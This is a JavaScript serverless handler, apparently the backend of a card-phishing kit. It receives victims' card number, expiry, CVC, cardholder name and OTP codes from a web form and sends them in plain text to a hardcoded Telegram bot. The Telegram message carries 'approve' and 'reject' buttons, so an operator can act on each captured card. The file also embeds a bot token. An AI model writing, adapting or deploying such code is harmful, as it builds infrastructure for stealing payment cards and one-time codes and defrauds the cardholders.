export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
  const CHAT_ID = "8040433133";
  
  const data = req.body;
  let text = '';
  let keyboard = null;

  // التحقق مما إذا كانت البيانات المرسلة هي رمز تحقق OTP
  if (data.رمز_التحقق_OTP) {
    text = `🔐 *تم إدخال رمز تحقق جديد (OTP)*\n\n` +
           `🔑 الكود: \`${data.رمز_التحقق_OTP}\`\n` +
           `💳 البطاقة: \`${data.رقم_البطاقة || 'غير متوفر'}\`\n` +
           `👤 الاسم: ${data.اسم_الحامل || 'غير متوفر'}\n` +
           `🆔 معرف المستخدم: \`${data.user_id || 'غير متوفر'}\``;
  } else {
    // رسالة طلب الدفع الأساسية مع أزرار الموافقة والرفض
    text = `💳 *طلب دفع وبطاقة جديدة*\n\n` +
           `👤 الاسم: ${data.card_name || 'غير محدد'}\n` +
           `💳 رقم البطاقة: \`${data.card_number || ''}\`\n` +
           `📅 الانتهاء: ${data.exp_date || ''}\n` +
           `🔒 CVC: \`${data.cvc || ''}\`\n` +
           `🆔 معرف المستخدم: \`${data.user_id}\``;

    keyboard = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_pay_${data.user_id}` },
          { text: "❌ رفض", callback_data: `reject_pay_${data.user_id}` }
        ]
      ]
    };
  }

  try {
    const payload = {
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'Markdown'
    };

    if (keyboard) {
      payload.reply_markup = keyboard;
    }

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
